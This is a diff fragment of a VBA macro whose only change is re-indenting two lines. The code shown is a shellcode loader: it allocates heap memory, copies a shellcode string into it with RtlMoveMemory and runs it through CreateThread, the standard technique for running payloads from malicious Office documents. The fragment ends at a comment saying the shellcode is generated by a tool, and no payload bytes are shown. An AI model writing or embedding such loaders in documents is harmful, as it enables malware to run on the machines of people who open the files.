@@ -15,8 +15,8 @@ Public Sub myMacro()
     AllocH = HeapAlloc(hHeap, &H8, Len(sShellCode))
     MsgBox "Address: " & Hex(AllocH)
 
-        RtlMoveMemory AllocH, sShellCode, Len(sShellCode)
-        run = CreateThread(0, 0, AllocH, 0, 0, 0)
+    RtlMoveMemory AllocH, sShellCode, Len(sShellCode)
+    run = CreateThread(0, 0, AllocH, 0, 0, 0)
 End Sub
 
 ' Shellcode below plus additional functions are generated with
